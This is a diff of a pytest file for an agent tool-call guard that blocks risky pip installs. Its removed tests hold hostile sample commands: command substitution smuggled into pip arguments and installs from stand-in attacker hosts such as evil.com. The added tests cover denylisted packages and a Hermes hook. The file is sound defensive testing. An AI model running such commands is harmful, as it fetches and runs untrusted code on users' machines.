-@pytest.mark.asyncio
-async def test_bash_tool_braced_env_var_blocked(tmp_path):
-    plugin = _make_plugin(tmp_path)
-    call = ToolCall(name="bash", args={"command": "pip install ${EVIL}"})
-
-    result = await plugin.before_tool_call(call)
-
-    assert isinstance(result, ToolResult)
-    assert result.is_error
-
-
-@pytest.mark.asyncio
-async def test_bash_tool_command_sub_blocked(tmp_path):
-    plugin = _make_plugin(tmp_path)
-    call = ToolCall(name="bash", args={"command": "pip install $(evil-cmd)"})
-
-    result = await plugin.before_tool_call(call)
-
-    assert isinstance(result, ToolResult)
-    assert result.is_error
-
-
-@pytest.mark.asyncio
-async def test_bash_tool_git_plus_https_blocked(tmp_path):
-    plugin = _make_plugin(tmp_path)
-    call = ToolCall(name="bash", args={"command": "pip install git+https://evil.com/pkg.git"})
-
-    result = await plugin.before_tool_call(call)
-
-    assert isinstance(result, ToolResult)
-    assert result.is_error
-
-
-@pytest.mark.asyncio
-async def test_bash_tool_git_plus_ssh_blocked(tmp_path):
-    plugin = _make_plugin(tmp_path)
-    call = ToolCall(
-        name="bash",
-        args={"command": "pip install git+ssh://github.com/attacker/pkg.git"},
-    )
-
-    result = await plugin.before_tool_call(call)
-
-    assert isinstance(result, ToolResult)
-    assert result.is_error
-
-
-def test_tokenize_packages_skips_git_url():
-    """git+ URLs must be silently skipped, not treated as package names."""
-    pkgs = _tokenize_packages("git+https://evil.com/pkg.git requests")
-    assert pkgs == ["requests"]
-    assert not any("git+" in p for p in pkgs)
+async def test_evaluate_command_sync_under_running_loop(tmp_path):
+    from agentshield.enforce.command_scan import evaluate_command_sync
+
+    guard = _make_guard(tmp_path, {"denylist": ["colouredlogs"]})
+    # We are inside a running loop here; the sync wrapper must not raise.
+    decision = evaluate_command_sync(guard.shield, "pip install colouredlogs", source="hermes")
+    assert decision.action == DecisionAction.BLOCK
+
+
+# ── interop with the REAL Hermes block extractor (skips if Hermes absent) ─────
+
+
+def test_interop_with_real_hermes_block_extractor(tmp_path):
+    """Drive Hermes's own ``get_pre_tool_call_block_message`` with our real
+    callback. This is the genuine enforcement path ``run_agent.py`` uses before
+    dispatching a tool — it calls ``invoke_hook('pre_tool_call', ...)`` and reads
+    ``{"action": "block", "message": ...}`` from the results. Skips cleanly when
+    the Hermes package isn't installed (e.g. plain repo CI); runs for real inside
+    a configured Hermes container.
+    """
+    plugins = pytest.importorskip("hermes_cli.plugins")
+    guard = _make_guard(tmp_path, {"denylist": ["evil-pkg"], "allowlist": ["requests"]})
+    mgr = plugins.get_plugin_manager()
+    mgr._hooks.setdefault("pre_tool_call", []).append(guard.pre_tool_call)
+    try:
+        blocked = plugins.get_pre_tool_call_block_message(
+            "terminal", {"command": "pip install evil-pkg"}
+        )
+        assert blocked and "evil-pkg" in blocked
+        allowed = plugins.get_pre_tool_call_block_message(
+            "terminal", {"command": "pip install requests"}
+        )
+        assert allowed is None
+    finally:
+        mgr._hooks["pre_tool_call"].remove(guard.pre_tool_call)
